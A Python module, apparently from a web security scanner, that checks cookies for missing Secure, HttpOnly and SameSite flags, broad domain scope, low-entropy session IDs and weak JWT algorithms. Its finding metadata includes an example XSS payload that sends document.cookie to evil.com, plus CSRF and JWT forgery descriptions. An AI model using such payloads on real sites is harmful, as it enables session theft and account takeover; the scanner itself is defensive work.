"""
Cookie security scanner for WebRipper Recon.

Analyzes cookies from HTTP responses for security flags, scope,
entropy, JWT analysis, and sensitive data exposure.
"""

from __future__ import annotations

import base64
import json
import math
import re
import time
from typing import Dict, List
from urllib.parse import urlparse

from .base import BaseScanner
from ..models import Finding, ScanResult, Severity


def _entropy(data: str) -> float:
    """Calculate Shannon entropy of a string."""
    if not data:
        return 0.0
    freq: Dict[str, int] = {}
    for c in data:
        freq[c] = freq.get(c, 0) + 1
    length = len(data)
    return -sum((count / length) * math.log2(count / length) for count in freq.values())


def _decode_jwt_part(part: str) -> dict:
    """Decode a single JWT segment (header or payload)."""
    try:
        padded = part + "=" * ((4 - len(part) % 4) % 4)
        decoded = base64.urlsafe_b64decode(padded)
        return json.loads(decoded)
    except Exception:
        return {}


class CookieScanner(BaseScanner):
    """Analyzes cookies for security flags, scope, JWT issues, and sensitive data."""

    @property
    def name(self) -> str:
        return "cookies"

    @property
    def description(self) -> str:
        return "Analyzes cookies for security flags, entropy, JWT issues, and sensitive data"

    def scan(self) -> ScanResult:
        start = time.time()
        cookies = self._collect_cookies()
        self._log(f"Analyzing {len(cookies)} cookies...")

        for cookie_str, source_url in cookies:
            self._analyze_cookie(cookie_str, source_url)

        self._log(f"Cookie scan complete: {len(self._findings)} findings")
        return self._build_result(start, cookies_analyzed=len(cookies))

    def _collect_cookies(self) -> List[tuple]:
        """Collect Set-Cookie headers from all responses."""
        cookies = []
        for f in self._report.files:
            if not f.response_headers:
                continue
            for key, value in f.response_headers.items():
                if key.lower() == "set-cookie":
                    if isinstance(value, list):
                        for v in value:
                            cookies.append((v, f.url))
                    elif "\n" in value:
                        for v in value.split("\n"):
                            if v.strip():
                                cookies.append((v.strip(), f.url))
                    else:
                        cookies.append((value, f.url))
        return cookies

    def _analyze_cookie(self, cookie_str: str, url: str) -> None:
        lower = cookie_str.lower()
        parts = cookie_str.split(";")
        name_value = parts[0].strip()
        eq_idx = name_value.find("=")
        if eq_idx < 0:
            return
        name = name_value[:eq_idx].strip()
        value = name_value[eq_idx + 1:].strip()

        target_host = urlparse(self._settings.url).hostname or ""
        attributes = [p.strip().lower() for p in parts[1:]]
        has_secure = any(a == "secure" for a in attributes)
        has_httponly = any(a == "httponly" for a in attributes)
        has_samesite = any(a.startswith("samesite") for a in attributes)

        # Security flags
        if not has_secure:
            self._add_finding(Finding(
                severity=Severity.HIGH, category="cookies",
                title=f"Cookie '{name}' missing Secure flag",
                description="Cookie can be sent over unencrypted HTTP connections.",
                evidence=cookie_str[:200],
                url=url,
                remediation="Add the Secure flag: Set-Cookie: name=value; Secure",
                metadata={
                    "exploit": "On a network with HTTP available, attacker forces a request to http://target.com (via image tag, redirect, or WiFi captive portal). The cookie is sent in plaintext and captured with Wireshark.",
                    "impact": "Session hijacking via network sniffing",
                    "cwe": "CWE-614", "owasp": "A02:2021 Cryptographic Failures",
                    "time_to_exploit": "~3 minutes on shared network",
                },
            ))

        if not has_httponly:
            self._add_finding(Finding(
                severity=Severity.HIGH, category="cookies",
                title=f"Cookie '{name}' missing HttpOnly flag",
                description="Cookie accessible to JavaScript via document.cookie.",
                evidence=cookie_str[:200],
                url=url,
                remediation="Add HttpOnly flag: Set-Cookie: name=value; HttpOnly",
                metadata={
                    "exploit": "Any XSS vulnerability on the site can steal this cookie: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>. Attacker gets the session cookie and logs in as the victim.",
                    "impact": "Session hijacking via XSS — one XSS = account takeover",
                    "cwe": "CWE-1004", "owasp": "A05:2021 Security Misconfiguration",
                    "time_to_exploit": "~1 minute if XSS exists",
                },
            ))

        if not has_samesite:
            self._add_finding(Finding(
                severity=Severity.MEDIUM, category="cookies",
                title=f"Cookie '{name}' missing SameSite flag",
                description="Cookie may be sent with cross-site requests (CSRF risk).",
                evidence=cookie_str[:200],
                url=url,
                remediation="Add SameSite=Lax or SameSite=Strict: Set-Cookie: name=value; SameSite=Lax",
                metadata={
                    "exploit": "Without SameSite, the cookie is sent with cross-origin form submissions. Attacker on evil.com creates a form that submits to target.com/api/transfer?amount=10000&to=attacker. The victim's cookie authenticates the request.",
                    "impact": "CSRF attacks — attacker performs actions as the victim",
                    "cwe": "CWE-1275", "owasp": "A01:2021 Broken Access Control",
                    "time_to_exploit": "~5 minutes",
                },
            ))

        # Cookie scope
        domain_match = re.search(r"domain=([^;]+)", lower)
        if domain_match:
            domain = domain_match.group(1).strip()
            clean_dom = domain.lstrip(".")
            if clean_dom.count(".") >= 1 and target_host:
                # Flag broad domain scoping when scoped to root domain while running on a subdomain or explicitly prefixed with dot
                if (domain.startswith(".") or target_host != clean_dom) and target_host.endswith(clean_dom):
                    self._add_finding(Finding(
                        severity=Severity.MEDIUM, category="cookies",
                        title=f"Cookie '{name}' has broad domain scope: {domain}",
                        description="Cookie is scoped across subdomains, increasing attack surface.",
                        evidence=f"domain={domain}",
                        url=url,
                        remediation=f"Scope cookie to specific subdomain: domain={target_host}",
                        metadata={
                            "exploit": f"Cookie is shared across ALL {clean_dom} subdomains. If ANY subdomain is compromised (e.g., legacy or dev subdomain), the attacker reads this cookie. Every subdomain becomes an entry point.",
                            "impact": "Session hijacking via subdomain compromise",
                            "cwe": "CWE-1004", "owasp": "A05:2021 Security Misconfiguration",
                            "time_to_exploit": "~15 minutes (requires subdomain compromise)",
                        },
                    ))

        # Session entropy
        if len(value) >= 8 and any(s in name.lower() for s in ("session", "sid", "sess", "phpsessid", "jsessionid", "asp.net_sessionid")):
            ent = _entropy(value)
            if ent < 3.0:
                self._add_finding(Finding(
                    severity=Severity.HIGH, category="cookies",
                    title=f"Low-entropy session cookie: {name}",
                    description=f"Session ID has low entropy ({ent:.1f} bits/char) — may be predictable.",
                    evidence=f"{name}={value[:50]} (entropy: {ent:.2f})",
                    url=url,
                    remediation="Use cryptographically secure random session IDs (at least 128 bits of entropy). Use your framework's built-in session management.",
                    metadata={
                        "exploit": f"Low entropy ({ent:.1f}) means the session ID follows a pattern. Attacker writes a script to brute-force or predict valid session IDs, trying sequential/incremented values until one works.",
                        "impact": "Session hijacking via prediction — attacker logs in as any user",
                        "cwe": "CWE-330", "owasp": "A02:2021 Cryptographic Failures",
                        "time_to_exploit": "~30 minutes to script brute-forcer",
                    },
                ))

        # JWT detection
        if value.count(".") == 2 and value.startswith("eyJ"):
            parts_jwt = value.split(".")
            header = _decode_jwt_part(parts_jwt[0])
            payload = _decode_jwt_part(parts_jwt[1])

            if header or payload:
                # Report JWT details
                alg = header.get("alg", "unknown")
                claims_str = json.dumps(payload, indent=2)[:500]

                sev = Severity.INFO
                exploit = "JWT in cookie exposes token claims to client-side inspection."

                if alg.lower() == "none":
                    sev = Severity.CRITICAL
                    exploit = "JWT uses 'alg: none' — attacker modifies the payload (e.g., changes user_id or role), removes the signature, and the server accepts it as valid. Full authentication bypass."
                elif alg.upper().startswith("HS") and payload.get("role") in ("admin", "superadmin", "root"):
                    sev = Severity.HIGH
                    exploit = f"JWT contains role='{payload.get('role')}' with HMAC signing. If the secret is weak, attacker brute-forces it with jwt-cracker, then forges tokens with any role."

                self._add_finding(Finding(
                    severity=sev, category="cookies",
                    title=f"JWT cookie: {name} (alg: {alg})",
                    description=f"JWT token found in cookie with algorithm '{alg}'.",
                    evidence=f"Header: {json.dumps(header)}\nPayload: {claims_str}",
                    url=url,
                    remediation="Use RS256 or ES256 instead of HS256. Never use 'alg: none'. Keep signing keys secret and rotate regularly.",
                    metadata={
                        "exploit": exploit,
                        "impact": "Token forgery, privilege escalation, authentication bypass" if sev != Severity.INFO else "Information disclosure",
                        "cwe": "CWE-347" if sev != Severity.INFO else "",
                        "owasp": "A02:2021 Cryptographic Failures",
                        "time_to_exploit": "~5 minutes for alg:none, ~1 hour for weak HMAC secret",
                    },
                ))
